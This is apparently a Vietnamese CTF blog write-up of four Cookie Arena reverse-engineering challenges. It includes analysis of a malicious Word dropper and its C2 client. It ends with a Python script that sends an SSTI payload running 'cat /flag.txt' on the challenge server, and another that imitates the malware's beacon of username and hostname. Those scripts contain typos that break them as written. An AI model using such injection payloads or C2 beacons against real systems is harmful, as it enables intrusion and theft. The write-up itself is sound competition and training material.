---
title: "Cookie Arena 2 | Reverse Engineering"
date: "2023-07-09"
excerpt: "Clear Reverse Engineering giải Cookie Arena mùa 2 "
---

![](/images/cookie_arena_2/featured.png)

## Pyreverse
> Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.

Sử dụng [pydumpck](https://github.com/serfend/pydumpck) để decompile `exe` --> `py`: 

```python
# pyreverser.pyc.cdc.py
import base64

def reverse_string(s):
    return s[::-1]


def scramble_flag(flag):
    scrambled = ''
    for i, char in enumerate(flag):
        if i % 2 == 0:
            scrambled += chr(ord(char) + 1)
            continue
        scrambled += chr(ord(char) - 1)
    return scrambled


def main():
    print(base64.b64decode('Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ=='))
    secret_flag = scramble_flag(reverse_string(base64.b64decode('Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==')).decode())
    print('Welcome to PyReverser!')
    print('Please enter a word or phrase:')
    user_input = input()
    generated_value = scramble_flag(reverse_string(user_input.upper()))
    print('Generated value:', generated_value)
    print('Can you find the hidden flag?')
    reversed_flag = reverse_string(secret_flag)
    print('Reversed flag:', reversed_flag)

if __name__ == '__main__':
    main()
```

Để ý flag được decode từ đoạn base64 bên trên  

```bash
root@Spid3r:~# echo 'Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==' | base64 -d   
CHH{python2Exi_Reverse_ENginering}
```

## Jump

> Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​

### Phân tích file
Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)

![](/images/cookie_arena_2/image.png)

Lợi dụng chạy hàm `_flag` bằng cách nhập ​địa chỉ `_flag` vào ô nhập khi chạy jump.exe

### Tìm địa chỉ `_flag` và lấy flag

* Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump)

![](/images/cookie_arena_2/image-3.png)

* Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag)

![](/images/cookie_arena_2/image-2.png)

Lưu ý: địa chỉ `00401500` đang ở hexa --> đổi sang decimal là `4199680​`

![](/images/cookie_arena_2/image-1.png)

## Rev1
> Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.

![](/images/cookie_arena_2/image12.png)

### Phân tích file

![](/images/cookie_arena_2/image-5.png)

`PE32` --> 32 bits

`GUI` --> WinMain

### WinMain

* Xử lý I/O
  
![](/images/cookie_arena_2/image-6.png)

Kiểm tra trong `DialogBoxParamA`

![DialogBoxParamA](image-7.png)

Hàm `GetItemTextA` sẽ lấy các string được input vào và check key qua `sub_402030`

![sub_402030](image-8.png)

Kiểm tra hàm này thì thấy rằng `dword_414448` chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)

### Debug 
{{< video src="media1.mp4" poster="./video-poster.png" >}}

Dựa vào những gì debug được có thể viết lại đoạn code dưới đây: 

![](/images/cookie_arena_2/image19.png)

Đến đây thì chỉ đơn giản là dùng z3 để viết script giải [solve_rev1.py](solve_rev1.py) để lấy key

![flag](image20.png)

## CV Malware
> Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C&C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!

Mang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))

![File Word của challenge](image22.png)

### Phân tích file

![](/images/cookie_arena_2/image23-1.png)

Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)

![](/images/cookie_arena_2/image-9.png)

### Unzip & check
Từ đây mình tiến hành giải nén "file zip" này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)

![](/images/cookie_arena_2/image-10.png)

![](/images/cookie_arena_2/image-12.png)

Qua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó

### Decode

![Decode hexa](image-13.png)

```
server:
   host: http://REPLACE_HOST_HERE
   secret: SecR3TtOKen
```
Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải

![Decode Base64](image-14.png)

Dựa vào header `MZ` của đoạn base64 được decode kia thì có thể đoán được đây là 1 file `exe` trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào

* main

![Hàm main](image-4.png)

Nhìn kỹ 1 chút thì ở đây có hàm `downloadFile` với tham số là `REPLACE_HOST_HERE`, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ `/static` về 

![](/images/cookie_arena_2/image-15.png)

Với host mặc định của challenge thì chắc chắn sẽ lấy file từ `http://103.97.125.53:31040/static/client.exe​` truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server. 

### client.exe
Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều

Load file vào IDA

![](/images/cookie_arena_2/image-16.png)

Dựa vào cách đặt tên thì có thể đoán được:
- `main_getSystemInfo()` là hàm lấy các thông tin của máy nạn nhân
- `main_sendPostRequest()` là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host)
- Còn về hàm `main_loadAllConfigs()` thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về `host` và `secret` ban nãy
* main_loadAllConfigs(): 

![](/images/cookie_arena_2/image-17.png)

Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini --> đổi thành `config.ini` và chuyển `host: http://103.97.125.53:31040`

### Bắt tương tác giữa client với host thông qua Wireshark
![](/images/cookie_arena_2/image-18.png)

![](/images/cookie_arena_2/image-19.png)

Từ đây có thể thấy client gửi các thông tin về `username`, `hostname` từ phía client đồng thời cùng với `secret: SecR3TtOken` lên server và được trả về `Logged username hostname`

Từ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:

```python
import request

url = "http://103.97.125.53:31040"
header = {
    "User-Agent": "Go-http-server/1.1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7", 
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "Secret": "SecR3Ttoken"
} 
payload = {
    "username": "SPID3R-MSI\Spid3r",
    "hostname": "Spider-msi"
}

response = requests.post(url, headers=headers, json=payload)
print(response.text)
# Logged SPID3R-MSI\Spid3r Spid3r-msi
```

Vậy thì đã giải quyết xong việc kết nối "nhân tạo" giữa client và server thông qua đoạn script trên
> dựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả `FLAG nằm trên host, tìm cách kết nối đúng và exploit` 

thì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag

![](/images/cookie_arena_2/image-20.png)

May thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi

Script giải:
```python
import request

url = "http://103.97.125.53:31040"
header = {
    "User-Agent": "Go-http-server/1.1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7", 
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "Secret": "SecR3Ttoken"
} 
payload = {
    "username": "{{url_for.__globals__.os.__dict__.popen('cat /flag.txt).read()}}",
    "hostname": "Spider-msi"
}

response = requests.post(url, headers=headers, json=payload)
print(response.text)
# Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi
```

